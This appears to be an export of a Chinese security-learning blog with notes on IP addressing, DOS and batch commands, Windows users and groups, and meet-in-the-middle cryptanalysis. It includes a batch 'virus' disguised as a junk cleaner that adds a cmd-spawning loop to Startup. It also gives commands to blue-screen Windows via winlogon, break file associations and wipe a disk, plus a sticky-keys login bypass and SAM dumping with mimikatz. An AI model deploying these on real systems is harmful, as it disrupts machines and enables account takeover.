<p>① 10.X.X.X是私有地址（所谓的私有地址就是在互联网上不使用，而被用在局域网络中的地址）<br>② 127.X.X.X是保留地址，用做循环测试用</p>
</li>
<li><p>B类：（大中型企业用）</p>
<p>position_1.position_2 网络地址，position_3.position_4 主机地址</p>
<p>范围：128.0.0.1—191.255.255.254</p>
<p>私有地址和保留地址：<br>① 172.16.0.0—172.31.255.255是私有地址<br>② 169.254.X.X是保留地址（如果你的IP地址是自动获取IP地址，而你在网络上又没有找到可用的<strong>DHCP服务器</strong>，就会得到其中一个IP）</p>
</li>
<li><p>C类：(个人使用，最常见)</p>
<p>position_1.position_2.position_3 网络地址，position_4 主机地址</p>
<p>范围：192.0.0.1—223.255.255.254</p>
<p>私有地址：<br>192.168.X.X是私有地址</p>
</li>
<li><p>D类：（组播地址）</p>
<p>不分网络地址和主机地址，它的第1个字节的前四位固定为1110</p>
</li>
<li><p>E类：（科研使用）<br>不分网络地址和主机地址，它的第1个字节的前四位固定为11110</p>
</li>
</ul>
<h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>规定 ip 在哪个网段，如 ip ： 192.168.1.1 子网掩码：255.255.240.0</p>
<p>二进制表示：</p>
<p>11000000.10101000.00000001.00000001 ip</p>
<p>11111111.11111111.11110000.00000000 子网掩码 （not = 00000000.00000000.00001111.11111111）</p>
<p><strong>在子网掩码非 1 的部分为该网段可用地址</strong></p>
<ul>
<li>ip 与 子网掩码之间的关系：（保留地址）</li>
</ul>
<p>ip and 子网掩码 = 11000000.10101000.00000000.00000000 = 192.168.0.0 为<strong>网络号</strong></p>
<p>ip or not 子网掩码 =  11000000.10101000.00001111.11111111 = 192.168.15.255 为<strong>广播地址</strong></p>
<p>所以也可表示为 192.168.1.1/24 （表示该ip子网掩码长度24位1）</p>
<p>参考： </p>
<blockquote>
<p><a href="https://blog.csdn.net/wujiafei_njgcxy/article/details/53672410">5类ip地址</a></p>
<p><a href="https://www.bilibili.com/video/BV1v44y1g7Hf?p=1&amp;share_medium=iphone&amp;share_plat=ios&amp;share_session_id=791F56D7-CDA5-44B3-87C0-0ECC2828078D&amp;share_source=WEIXIN&amp;share_tag=s_i&amp;timestamp=1653636322&amp;unique_k=GzxogMD">什么是子网掩码</a></p>
<p><a href="https://www.huaweicloud.com/zhishi/edits-15756158.html">ip地址和子网掩码的关系</a></p>
</blockquote>
<h2 id="网关（简单理解）"><a href="#网关（简单理解）" class="headerlink" title="网关（简单理解）"></a>网关（简单理解）</h2><p>相当于一个转换器，用于寻找要通信的另一方：</p>
<p>pc向外发包</p>
<p>1、首先判断目标IP与自己是否在 同一个网段</p>
<p>2、如在同一个网段，则直接发出去，不找网关</p>
<p>3、<strong>如不在同一个网段，则发包给网关</strong></p>
<blockquote>
<p>ping 命令：</p>
<p>ping 目标IP地址                       #测试网络连通性，有去有回即为可以成功通路</p>
<p>ping -t 目标IP地址                    #一直ping</p>
<p>ping -n 数字 目标ip地址           #修改ping包的数量（默认4）</p>
<p>ping -l 数字 目标ip地址            #修改ping 包的大小</p>
<p>ipconfig      #查看ip基本信息</p>
<p>ipconfig /all   #查看ip所有信息</p>
</blockquote>
<h2 id="DNS-域名系统-Domain-Name-System"><a href="#DNS-域名系统-Domain-Name-System" class="headerlink" title="DNS 域名系统 Domain Name System"></a>DNS 域名系统 <strong>D</strong>omain <strong>N</strong>ame <strong>S</strong>ystem</h2><p>它作为将<a href="https://baike.baidu.com/item/域名/86062">域名</a>和<a href="https://baike.baidu.com/item/IP地址/150859">IP地址</a>相互<a href="https://baike.baidu.com/item/映射/20402620">映射</a>的一个<a href="https://baike.baidu.com/item/分布式数据库/1238109">分布式数据库</a>，能够使人更方便地访问互联网</p>
<blockquote>
<p>手工解析域名</p>
<p>nslookup www.baidu.com</p>
</blockquote>
<h2 id="DOS命令"><a href="#DOS命令" class="headerlink" title="DOS命令"></a>DOS命令</h2><blockquote>
<p>cd..               返回上级目录</p>
<p>cd\                返回根目录</p>
<p>d:                 进入D盘</p>
<p>cls                清空所有dos操作</p>
<p>dir                显示当前盘符文件信息</p>
<p>rd . /s/q        清空磁盘</p>
<p><strong>浏览文件</strong></p>
<p>type 文件名.扩展名                 显示</p>
<p>type 文件名.扩展名 |more       分页显示</p>
<p>例如：dir c:\windows |more</p>
<p><strong>创建文件</strong></p>
<p>md 文件夹名称                创建文件夹</p>
<p>echo “内容”&gt;文件名         创建文件</p>
<p><em>还要其他方式</em></p>
<p><strong>删除文件</strong></p>
<p>del *.txt                  删除所有txt结尾的文件</p>
<p>del <em>.</em>                    删除文件</p>
<p>del <em>.</em> /s/q             无提示删除</p>
<p>attrib +h 文件名         隐藏文件夹</p>
<p>attrib -h 文件名          取消文件夹</p>
<p>attrib +h +s +a 文件名              将文件夹隐藏设为系统文件</p>
<p>dir /a                          显示当前磁盘所有包括系统文件</p>
<p>快速生成一个空文件（有大小）</p>
<p>fsutil file createnew c:\system.ini 数字       在c盘创建文件指定文件大小</p>
<p><strong>修改关联</strong></p>
<p>参考：<a href="https://cloud.tencent.com/developer/news/682376">assoc 修改文件关联</a></p>
<p>assoc .txt=exefile         修改打开txt文件的程序 使其无法打开</p>
<p>assoc .txt=txtfile           恢复</p>
<p>(未成功)</p>
<p><strong>shutdown</strong></p>
<p>shutdown -s -t 100 定时关机</p>
<p>shutdown -s -f -t 100 定时强制关机</p>
<p>shutdown -r -t 秒 定时重启</p>
<p>shutdown -a 取消定时</p>
<p>shutdown -l 注销，同logoff命令相同</p>
<p>shutdown -s -f -t 100 -c “haah”</p>
<p><strong>文件操作</strong></p>
<p>ren 旧名 新名                      重命名</p>
<p>move 原地址 新地址           移动</p>
<p>copy 原地址 目的地址         复制粘贴</p>
</blockquote>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>CS_OP</tag>
      </tags>
  </entry>
  <entry>
    <title>网安学习-D-3-批处理，脚本，过时小病毒</title>
    <url>/2022/05/27/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-3-%E6%89%B9%E5%A4%84%E7%90%86%EF%BC%8C%E8%84%9A%E6%9C%AC%EF%BC%8C%E8%BF%87%E6%97%B6%E5%B0%8F%E7%97%85%E6%AF%92/</url>
    <content><![CDATA[<p>环境：win2003 虚拟机</p>
<p>只做简单了解，并不深究…</p>
<h2 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h2><p>建一个 txt 文件，后缀名改成 bat 变成批处理文件</p>
<p>使用的是 <a href="https://www.jianshu.com/p/02f6fe974cfd">DOS 命令语法</a> </p>
<p><strong>发布博客的批处理文件</strong></p>
<p>我自己的：</p>
<ol>
<li>push</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
<ol>
<li>check</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line">start <span class="string">&quot;C:\Program Files\Google\Chrome\Application&quot;</span> http://localhost:4000/</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
<p>3.NewBlog</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">d:</span><br><span class="line"><span class="built_in">cd</span> D:\Docc\GitBlog</span><br><span class="line"><span class="built_in">set</span> /p title=Input_NewBlog`s title:</span><br><span class="line">hexo n %title%</span><br></pre></td></tr></table></figure>
<p><strong>一个小例子</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">@echo off         </span><br><span class="line">color <span class="number">0</span>a             </span><br><span class="line">title 飞哥小程序v1<span class="number">.0</span> </span><br><span class="line"> </span><br><span class="line">:menu</span><br><span class="line">cls</span><br><span class="line">echo ==========================</span><br><span class="line">echo               菜单</span><br><span class="line">echo         <span class="number">1</span>、修改管理员密码</span><br><span class="line">echo         <span class="number">2</span>、定时关机</span><br><span class="line">echo         <span class="number">3</span>、退出本程序</span><br><span class="line">echo ===========================</span><br><span class="line"> </span><br><span class="line"><span class="built_in">set</span> /p num=您的选择是：   </span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;1&quot;</span> <span class="keyword">goto</span> <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;2&quot;</span> <span class="keyword">goto</span> <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%num%&quot;</span>==<span class="string">&quot;3&quot;</span> <span class="keyword">goto</span> <span class="number">3</span></span><br><span class="line">echo 被闹，好好输！</span><br><span class="line">pause	<span class="comment">//暂停</span></span><br><span class="line"><span class="keyword">goto</span> menu	<span class="comment">//跳转</span></span><br><span class="line"> </span><br><span class="line">:<span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> /p u=请输入用户名:	<span class="comment">//set /p 等待变量输入 u 变量</span></span><br><span class="line"><span class="built_in">set</span> /p p=请输入新密码:</span><br><span class="line">net user %u% %p%   &gt;nul		<span class="comment">// &gt;nul 清楚命令执行后系统反馈</span></span><br><span class="line">echo 您的密码已经设置成功!</span><br><span class="line">pause</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line"> </span><br><span class="line">:<span class="number">2</span></span><br><span class="line"><span class="built_in">set</span> /p time=请输入时间：</span><br><span class="line">shutdown -s -t %time%  </span><br><span class="line"><span class="built_in">set</span> /p x=是否取消（<span class="number">1</span>：是，<span class="number">0</span>：否）：</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;%x%&quot;</span>==<span class="string">&quot;1&quot;</span> shutdown -a</span><br><span class="line"><span class="keyword">goto</span> menu</span><br><span class="line">pause</span><br><span class="line"> </span><br><span class="line">:<span class="number">3</span></span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ossimg.yzitc.com/2022/05/27/ff1fe64a50f38.png"></p>
<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><p>新建 txt 文件，后缀名改为 vbs（Microsoft <strong>Visual Basic Script</strong> Edition） 即为简单的脚本</p>
<p>如：</p>
<figure class="highlight vbscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line"> msgbox <span class="string">&quot;I am a script!!&quot;</span></span><br><span class="line"><span class="keyword">loop</span></span><br></pre></td></tr></table></figure>
<p>效果：(一直循环，关不掉，需要在任务管理器中找到进程 wscript.exe 强制关掉)</p>
<p><img src="https://ossimg.yzitc.com/2022/05/27/80cf40b1595db.png"></p>
<p>参考：</p>
<p><a href="https://baike.baidu.com/item/vbs/1700748?fr=aladdin">vbs脚本语言</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/367897802">vbs基本语法1</a></p>
<p><a href="https://blog.csdn.net/xiaozhi_95/article/details/81669270">vbs基本语法2</a></p>
<h2 id="过时小病毒"><a href="#过时小病毒" class="headerlink" title="过时小病毒"></a>过时小病毒</h2><p>几个想法：</p>
<ul>
<li>添加 开机自启动项，无限弹窗</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">title 系统垃圾清理</span><br><span class="line">color 2f</span><br><span class="line"><span class="built_in">echo</span> =======若杀毒软件恶意拦截，请选择【允许程序的所有操作】========</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> :start&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> start cmd&gt;&gt;c:\windows\windows.bat</span><br><span class="line"><span class="built_in">echo</span> goto start&gt;&gt;c:\windows\windows.bat</span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%&quot;</span>\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\&quot; &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==0 goto next </span><br><span class="line">copy c:\windows\windows.bat <span class="string">&quot;%USERPROFILE%\「开始」菜单\程序\启动&quot;</span> &gt;nul</span><br><span class="line"><span class="keyword">if</span> %errorlevel%==1 goto error</span><br><span class="line">:next</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理中，请不要关闭窗口======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">ping -n 5 127.0.0.1 &gt;nul</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 垃圾清理完毕，共清理垃圾500M===</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 建议立即重启电脑</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:error</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span>   ====== 程序运行失败，请使用【管理员权限】重新运行！======</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line">pause</span><br><span class="line">goto ex</span><br><span class="line"> </span><br><span class="line">:ex</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<ul>
<li>杀死不能杀死的进程，导致蓝屏 （win2003）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ntsd -c q -pn winlogon.ex</span><br></pre></td></tr></table></figure>
<p>ntsd    ：杀死进程</p>
<p>ntsd -c q -pn 进程名   ：强制杀死进程</p>
<p>winlogon.exe    ：<a href="https://baike.baidu.com/item/winlogon/11002823?fromtitle=winlogon.exe&amp;fromid=8198444&amp;fr=aladdin">baike</a>    </p>
<ul>
<li>修改文件关联，使无法打开（前一章写过）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assoc.exe=txtfile</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>CS_OP</tag>
      </tags>
  </entry>
  <entry>
    <title>网安学习-D-4-用户，组管理</title>
    <url>/2022/05/29/CS/%E7%BD%91%E5%AE%89%E5%AD%A6%E4%B9%A0-D-4-%E7%94%A8%E6%88%B7%EF%BC%8C%E7%BB%84%E7%AE%A1%E7%90%86/</url>
    <content><![CDATA[<h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><p>每个用户有自己唯一的 SID（安全标识符），window 系统，通过命令 ：<code>wmic useraccount get name,sid</code> 查看</p>
<blockquote>
<p>windows 管理员 administrator 的 UID 是 500，普通用户 1000 开始</p>
<p>linux 管理员 root 的UID是 0 ，普通用户是1000开始</p>
</blockquote>
<p><img src="https://ossimg.yzitc.com/2022/05/29/15a458e7e437a.png"></p>
<p>windows ，账号密码存储的位置 ：<code>C:\windows\system32\config\SAM</code> 如果通过一定办法拿到 SAM 文件，并暴力搜索可以获得账号密码。</p>
<h3 id="插曲"><a href="#插曲" class="headerlink" title="插曲"></a>插曲</h3><p>0..0 本机尝试使用 mimikatz来读取SAM数据库，但win7虚拟机下无法下载 mimikatz，尝试使用 Vmware tools 但 win7 由于 认证问题无法安装，尝试办法 <a href="https://blog.csdn.net/teisite/article/details/117675403">解决VMware16在虚拟机Windows7下安装VMware tools问题</a> 未成功；尝试将搭建 win7 与 主机的 ftp 连接，传输 mimikatz 压缩包，待续…</p>
<p>以上所需步骤：</p>
<ol>
<li>搭建主机与虚拟机（win7+）ftp连接；</li>
<li>将 mimikatz 传输至虚拟机；</li>
<li>使用 mimikatz 通过以下参考获取账户密码。</li>
</ol>
<p>参考：</p>
<p><a href="https://blog.csdn.net/SHENNONGZHAIZHU/article/details/52435519">Windows中的SAM文件</a></p>
<p><a href="https://blog.csdn.net/qq_41874930/article/details/108149449?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E5%88%B0%20SAM%20%E6%96%87%E4%BB%B6&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-108149449.142^v11^pc_search_result_control_group,157^v12^control&amp;spm=1018.2226.3001.4187">sam文件获取与解密</a></p>
<p><a href="https://blog.csdn.net/xddtrue/article/details/116596500?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-116596500-blog-52435519.pc_relevant_antiscanv3&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-116596500-blog-52435519.pc_relevant_antiscanv3&amp;utm_relevant_index=5">通过SAM文件获取windows7密码</a></p>
<blockquote>
<p>system 系统账户，权限至高无上</p>
<p>local services 本地服务账户 普通权限</p>
<p>network services 网络服务账户 普通权限</p>
</blockquote>
<p>关于用户的一些简单 dos 命令：(切换到管理员用户下CMD)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net user</span><br><span class="line">net user 账户名 字符串   <span class="comment">#修改密码</span></span><br><span class="line">net user 账户名         <span class="comment">#查看账户信息</span></span><br><span class="line">net user 账户名 密码 /add  <span class="comment">#新建账户</span></span><br><span class="line">net user 账户名 /del  <span class="comment">#删除账户</span></span><br><span class="line">net user 账户名 /active:<span class="built_in">yes</span>/no  <span class="comment">#激活或禁用账户</span></span><br></pre></td></tr></table></figure>
<h2 id="组"><a href="#组" class="headerlink" title="组"></a>组</h2><p>组的作用：简化权限赋予</p>
<p>赋权限方式：</p>
<p>1)用户 - 组-赋权限</p>
<p>2)用户-赋权限</p>
<p>内置组（系统自带组）</p>
<p>内置组的权限已经被系统赋予</p>
<blockquote>
<p>administrators      #管理员组<br>guests             #来宾组<br>users              #普通用户组<br>network            #网络配置组<br>print              #打印机组<br>Remote Desktop     #远程桌面组</p>
</blockquote>
<p>简单的关于组的 dos 命令:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">net localgroup     <span class="comment">#查看组</span></span><br><span class="line">net localgroup 组名    <span class="comment">#查看组</span></span><br><span class="line">net localgroup 组名 /add     <span class="comment">#创建组</span></span><br><span class="line">net localgroup 组名 用户名 /add   <span class="comment">#添加组成员	(成员需要存在，net user new_user /add)</span></span><br><span class="line">net localgroup 组名 用户名 /del   <span class="comment">#删除组成员</span></span><br><span class="line">net localgroup 组名 /del       <span class="comment">#删除组</span></span><br></pre></td></tr></table></figure>
<p>@@</p>
<p>服务器远程管理</p>
<p>图形化远程管理</p>
<p>运行 ：“mstsc”</p>
<p>telnet（命令行）\</p>
<p>查看本地上所有开放的端口 cmd “netstat -an”</p>
<p>telnet：23</p>
<p>远程桌面协议RDP：3389</p>
<p>@@</p>
<p>//没做呢//</p>
<h2 id="5-次-shift-的-win7-小漏洞"><a href="#5-次-shift-的-win7-小漏洞" class="headerlink" title="5 次 shift 的 win7 小漏洞"></a>5 次 shift 的 win7 小漏洞</h2><p>基本思路：</p>
<p>在 win 7 登录界面按 5 次 shift 可以会启动 sethc 程序，尝试将该程序换成 cmd.exe 就可以使用命令更改用户密码。</p>
<p>步骤：</p>
<blockquote>
<ol>
<li>win 7 断电</li>
<li>启动时进入系统修复界面（如果没出现修复选项，启动时按 F8）</li>
<li>修复是出现系统还原选择取消，出现“无法修复”的弹窗时，点击查看问题详情会出现一个内部声明（该声明在系统磁盘内，是一个进入系统修改文件的口子。</li>
<li>点进文档，另存为会出现文件目录，找到 <code>c:\windows\system32</code>目录，将 sethc 程序改名，cmd 程序复制改成 sethc。</li>
<li>重启系统，在输密码界面再次 5 次 shift，就会启动 cmd（管理员） 而非 sethc，通过命令修改用户密码</li>
</ol>
</blockquote>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>CS_OP</tag>
      </tags>
  </entry>
  <entry>
    <title>MITM AttacK</title>
    <url>/2022/05/27/Cryptanalysis/About%20MITM%20and%20variants/</url>
    <content><![CDATA[<h1 id="Classical-MITM"><a href="#Classical-MITM" class="headerlink" title="Classical MITM"></a>Classical MITM</h1><p>在 Hellman 的文章<a href="https://www.computer.org/csdl/magazine/co/1977/06/01646525/13rRUwInvDu">Special Feature Exhaustive Cryptanalysis of the NBS Data Encryption Standard</a>中给出了中间相遇攻击的基本概念。</p>
<p>首先需要意识到，中间相遇攻击也是穷举，但是结合了 TMTO 的思想，通过建表存一部分值，穷搜另一部分值来达到比穷举攻击更好的效益。</p>
<p><strong>经典MITM</strong>：<br>有迭代的分组密码，分组长度为 $n$ ，子密钥可独立的分为 $K_1||K_2$ </p>
<p><strong>MITM stage</strong></p>
<ol>
<li><p>任取明密文对 $(P,C) $ ，将密钥做以下划分：</p>
<p>前向轮密钥记为 $K_1$ ，后向轮密钥记为 $K_2$</p>
</li>
<li><p>用前向的密钥对明文加密得到中间值 $U$ ；同样的，用后向的密钥对密文解密得到中间值 $V$ </p>
</li>
<li><p>匹配中间值，判断 $U\overset{?}{=}V$ 如果是，则将使用的密钥（全部bit）存入候选密钥表中，否则丢弃（在该过程中，可能会有一些随机值也能够匹配）</p>
</li>
</ol>
<p><strong>Testing stage</strong></p>
<p>再次任选明密文对 $(P_1,C_1)$ 并对候选密钥表进行二次筛查，重复步该过程直至候选密钥表中仅剩 1 个密钥，即为正确密钥。</p>
<p><strong>NOTE</strong>：</p>
<ol>
<li>以上过程如果能够保证前向和后向密钥能够覆盖全密钥空间，则在匹配到 $U=V$ 时即可能得到正确密钥，但不能保证随机值导致的误报不会出现（这里总可能数为 $2^{|K_1|+|K_2|}$ ，但匹配的长度为 $2^{n}$，明显 $|K_1|+|K_2| &gt; n$（安全标准），所以产生的中间值肯定会有很多误报）假设这里能够此处匹配到的概率是 $2^{-n}$ ，而全可能密钥数为 $2^{|K_1|+|K_2|}$ ，所以筛选留下的密钥数为 $2^{|K_1|+|K_2|-n}$，这需要在后续的测试阶段不断筛选；</li>
<li>能够使用经典中间相遇攻击的前提是子密钥的独立性。</li>
</ol>
<p><strong>复杂度分析</strong></p>
<p>时间复杂度：将更大的密钥拿来查询（内存比时间更贵），所以时间复杂度为：</p>
<script type="math/tex; mode=display">
T = max(2^{K_1},2^{K_2})</script><p>空间复杂度：将更小的密钥拿来查询，所以空间复杂度为：</p>
<script type="math/tex; mode=display">
M = min(2^{K_1},2^{K_2})</script><p>数据复杂度：留下的候选密钥 $|K_1|+|K_2|-n\ bits$ 而对每个新的明密文对， 理想情况下会筛掉 $n\ bits$ ，所以数据复杂度为：</p>
<script type="math/tex; mode=display">
D = \frac{|K_1|+|K_2|-n}{n}</script><p>（这里没有考虑建表和查表的时间，后面也不会考虑，如果考虑，通过较优化的算法如快速排序，二分查找之类，建表并排序的时间大概为 $2^{log(min(2^{K_1},2^{K_2}))}$，查表时间大概为 $2^{log(max(2^{K_1},2^{K_2}))}$）</p>
<h1 id="MITM-variant-No-OnE-partial-matching"><a href="#MITM-variant-No-OnE-partial-matching" class="headerlink" title="MITM variant No.OnE (partial matching)"></a>MITM variant No.OnE (partial matching)</h1><p>在进行经典 MITM 时，大多数情况不能在中间匹配到等于分组长度的状态，即 $n=s$ 往往不能满足。</p>
<p>所以更多情况下，往往只对分组长的部分比特进行匹配，也即部分匹配。</p>
<p>这是一种匹配的技巧，在中间相遇攻击中都会用到，如经典 MITM 的 MITM stage 中，步骤 2. 的得到的 $U\ and\ V$ 的长度往往比分组长度小，但这样部分匹配也引发了一定的问题：</p>
<p>见经典 MITM NOTE 1. 匹配到的概率会变小，如果状态长度为 $s\ (s&lt;n)$ 那么匹配到的概率就是 $2^{-s}$ ，留下的密钥数量就是$2^{|K_1|+|K_2|-s}$ ，在后面测试阶段就需要更多的明密文对来筛选候选密钥集。当然也可以利用并行搜索的办法，减少留下的候选密钥数量，并行 $N$ 个明密文对来进行 MITM ，留下的密钥数量就是$2^{|K_1|+|K_2|-N*s}$ ，MITM 阶段和测试阶段的操作没有实质性的变换，但复杂度需要重新考虑：</p>
<p><strong>复杂度分析：</strong></p>
<p>时间复杂度：并行 N 个明密文对，所以时间复杂度变为：</p>
<script type="math/tex; mode=display">
T = max(2^{K_1},2^{K_2})*N</script><p>空间复杂度：同样的，并行 N 个明密文对，所以空间复杂度变为：</p>
<script type="math/tex; mode=display">
M = min(2^{K_1},2^{K_2})*N</script><p>数据复杂度：MITM 阶段和测试阶段都使用了多个明密文对，取较大的作为数据复杂度量级：</p>
<script type="math/tex; mode=display">
D = max(\frac{|K_1|+|K_2|-s*N}{n},N)</script><h1 id="MITM-variant-No-TwO-3-subset"><a href="#MITM-variant-No-TwO-3-subset" class="headerlink" title="MITM variant No.TwO (3 subset)"></a>MITM variant No.TwO (3 subset)</h1><p>从经典的 MITM 考虑，如果子密钥不能独立，那么建表和穷举部分都无法独立进行，参考文章<a href="https://link.springer.com/chapter/10.1007/978-3-642-19574-7_16">A 3-Subset Meet-in-the-Middle Attack: Cryptanalysis of the Lightweight Block Cipher KTANTAN</a> 和文章<a href="https://link.springer.com/chapter/10.1007/978-3-642-31410-0_9">Three-Subset Meet-in-the-Middle Attack on Reduced XTEA</a> 了解使用 3 子集来构造具有独立性的子密钥集合，并结合穷举和经典 MITM 来进行中间相遇攻击。</p>
<p><img src="https://ossimg.yzitc.com/2022/05/27/d6d5603020045.png"></p>
<p>术语解释：</p>
<p>$K=k_{\ell-1} k_{\ell-2} \ldots k_{1} k_{0} \text { be the } \ell \text {-bit key. }$</p>
<p>$K_{1}=\left\{k_{i}: k_{i} \text { used by } \varphi_{1, \alpha}\right\}$</p>
<p>$K_{2}=\left\{k_{i}: k_{i} \text { used by } \varphi_{R-\beta+1, R}\right\}$</p>
<p>$A_{0}=K_{1} \cap K_{2}$是在前向 $\alpha$ 和后向 $\beta$ 都使用的密钥 <strong>比特</strong></p>
<p>$K = K_1 \cup K_2$</p>
<p><strong>NOTE</strong>:明确一点：$K,K_i$ 是以密钥个为单位，$Ai$ 以比特为单位；</p>
<p>$A_{1}=K_{1} \backslash K_{1} \cap K_{2} \text { and } A_{2}=K_{2} \backslash K_{1} \cap K_{2}$ 就比较好理解，这里 \ 表示除去而非经典数学的除法。例如：</p>
<p>密钥总位数为 $32\ bits$;相关部分为 $|A_0| = 21\ bits$ 那么 $|A_1|=|A_2|=11\ bits$</p>
<p><strong>3-subset MITM：</strong><br>有迭代的分组密码，分组长度为 $n$ ，子密钥不独立的分为 $K_1,K_2$，有 $A_0\ bits$ 为公用密钥，$A_{1}=K_{1} \backslash K_{1} \cap K_{2}\ bits\  \text { and }\  A_{2}=K_{2} \backslash K_{1} \cap K_{2}\ bits$</p>
<p><strong>MITM stage</strong></p>
<p>对任意一个明密文对 $(P,C)$ </p>
<ol>
<li>穷举所有 $A_0\ bits$ ，并对每一种 $A_0$ 情况，进行步骤 2. 3.；</li>
<li>将 $A_0$ 与 $A_1$ 拼接获得 $K_1$，前向加密得到中间值 $U$，将所有 $U$ 存入表 $T$;</li>
<li>将 $A_0$ 与 $A_2$ 拼接获得 $K_2$，向后解密得到中间值 $V$，将所有 $V$ 与表 $T$ 中所有值进行匹配（不一定匹配中间值的全部比特），匹配到的值存入候选密钥表 $T_{vc}$ 中;</li>
</ol>
<p><strong>Testing Stage</strong></p>
<p>和经典 MITM 相同，再任选不同的明密文对，对表 $T_{vc}$ 进行筛查，直到仅留下 1 个密钥。这里使用的明密文对数量和 $|A_0|$ 有关，显然是成反比的。</p>
<p><strong>复杂度分析</strong></p>
<p>不考虑并行明密文对，这里的 $A_0,A_1,A_2$ 表示密钥的长度$（bits)$：</p>
<p>时间复杂度：建表时间 $2^{A_0}<em>2^{A_1}$ ，匹配时间 $2^{A_0}</em>2^{A_2}$ ，总时间：</p>
<script type="math/tex; mode=display">
T = 2^{A_0}*(2^{A_1}+2^{A_2})</script><p>空间复杂度：</p>
<script type="math/tex; mode=display">
M = 2^{A_0}*min(2^{A_1}+2^{A_2})</script><p>数据复杂度：假设中间值匹配的位数为 $m\ :\ 1&lt;=m&lt;=n$ ，则留下的候选密钥为 $A_0(A_1+A_2) - m\ bits$，所以测试需要的明密文对为：</p>
<script type="math/tex; mode=display">
D = \frac{A_0(A_1+A_2) - m}{n}</script><h1 id="MITM-variant-No-ThreE-All-Subkey-Recovery"><a href="#MITM-variant-No-ThreE-All-Subkey-Recovery" class="headerlink" title="MITM variant No.ThreE (All Subkey Recovery)"></a>MITM variant No.ThreE (All Subkey Recovery)</h1><p>原始文章： <a href="https://link.springer.com/chapter/10.1007/978-3-642-35999-6_14">All Subkeys Recovery Attack on Block Ciphers: Extending Meet-in-the-Middle Approach</a></p>
<p>从经典中间相遇攻击而来，考虑到经典中间相遇攻击的局限性：</p>
<ol>
<li><p>需要子密钥相互独立，不独立情况见 “MITM variant No.TwO (3 subset)” 部分</p>
</li>
<li><p>由于密钥编排算法的限制，可能无法在仅获得部分子密钥的情况下获取主密钥</p>
</li>
</ol>
<p>ASR 攻击注意针对第 2 个局限进行改进，即试图使用中间相遇的思想来恢复全部子密钥，从而忽略密钥编排算法的影响，如果密钥编排可逆，也可以利用所有子密钥恢复主密钥。</p>
<p><strong>ASR attack</strong></p>
<p>假设分组密码分组长度为 $n$ ，加密函数为 $E$ ，有 $R$ 轮，且每轮使用不同的加密子密钥，子密钥不需要全部独立（但需要有部分独立的情况存在）</p>
<p><strong>MITM stage</strong></p>
<ol>
<li><p>攻击者确定中间碰撞状态 $S\ (s-bits)$ ；这个过程并不能独立后面的步骤，和 $K_1,K_2$ 的选取有很大关系</p>
